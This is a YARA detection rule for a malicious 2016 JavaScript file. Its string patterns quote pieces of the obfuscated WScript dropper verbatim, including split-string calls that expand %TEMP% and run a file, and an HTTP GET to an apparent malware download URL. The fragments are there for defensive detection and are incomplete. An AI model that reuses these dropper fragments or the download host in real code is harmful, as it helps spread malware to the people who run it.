rule sig_20160428_b034baf953ffeabe53688329bb92b53f {
  meta:
    description = "datamaliciousorder - file 20160428_b034baf953ffeabe53688329bb92b53f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6871cc505668ddfe50794e9300aea1995d3205355e250f419d3651fb64157074"

  strings:
    $s1  = "function KkuHrtDxuIhbTdiJekAcw() {return GgyNqhYylKbiAudLcfCts[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "var GgyNqhYylKbiAudLcfCts = function EfbGbzUvaWlyJnoKaiWyh() {return ItaDwmHbgUeyHixDrdDka[PgtUzoVrsApmHsuFfyGhv](\"WScript\"+\"" ascii
    $s3  = "function QbnXoiRzkZzrUblLdlRpl(EkrKclLukAfzWwgWvqQyc, HjmBciXfaEuyCocXsmQlp){HkaIwgBetVlqJilYmaJvk = HkaIwgBetVlqJilYmaJvk * 1; " ascii
    $s4  = "return EkrKclLukAfzWwgWvqQyc - HjmBciXfaEuyCocXsmQlp;};" fullword ascii
    $s5  = "BxgRkjCwrNqtQbdMptWeb[OsiDlvVylNbkAvrZttRby](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s6  = "var ItaDwmHbgUeyHixDrdDka = this[\"WScript\"];" fullword ascii
    $s7  = "var GgyNqhYylKbiAudLcfCts = function EfbGbzUvaWlyJnoKaiWyh() {return ItaDwmHbgUeyHixDrdDka[PgtUzoVrsApmHsuFfyGhv](\"WScript\"+\"" ascii
    $s8  = "function OjyCphTshLgpXjsSivQlo(KhyGooYoxAdhEhtAfkHca){GgyNqhYylKbiAudLcfCts[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function OjyCphTshLgpXjsSivQlo(KhyGooYoxAdhEhtAfkHca){GgyNqhYylKbiAudLcfCts[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function KkuHrtDxuIhbTdiJekAcw() {return GgyNqhYylKbiAudLcfCts[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (BxgRkjCwrNqtQbdMptWeb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function QbnXoiRzkZzrUblLdlRpl(EkrKclLukAfzWwgWvqQyc, HjmBciXfaEuyCocXsmQlp){HkaIwgBetVlqJilYmaJvk = HkaIwgBetVlqJilYmaJvk * 1; " ascii
    $s13 = "function PgxBqhDijVpwVvlCptScs(){return DjyEnmLgeYryXvfKluDsz + \"\";};" fullword ascii
    $s14 = "function QtxUhnIyyYvsFpkNgzUzf(StmYhgSfnMteKiwZajYar) {var SurNrjUzdKmgZdiTynPhw = (1, 2, 3, 4, 5, StmYhgSfnMteKiwZajYar); retur" ascii
    $s15 = "}while (UbhDhrQgwMnaUreYsmXbp);" fullword ascii
    $s16 = "return QbnXoiRzkZzrUblLdlRpl(1 == 1 ? SxeHucZzxNyaAxzYoeLll : 0, 1 == 1 ? JawUcnNdbZvkQyfSowYwu : 0);" fullword ascii
    $s17 = "var RzrLtqWviRkrWegXrnWcq = false;" fullword ascii
    $s18 = "function QtxUhnIyyYvsFpkNgzUzf(StmYhgSfnMteKiwZajYar) {var SurNrjUzdKmgZdiTynPhw = (1, 2, 3, 4, 5, StmYhgSfnMteKiwZajYar); retur" ascii
    $s19 = "function PksAyfUquUlqTnzDktGer(){return 23;};" fullword ascii
    $s20 = "function LlrHywHwuCpvZqpUkyXtd(){return PgtUzoVrsApmHsuFfyGhv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}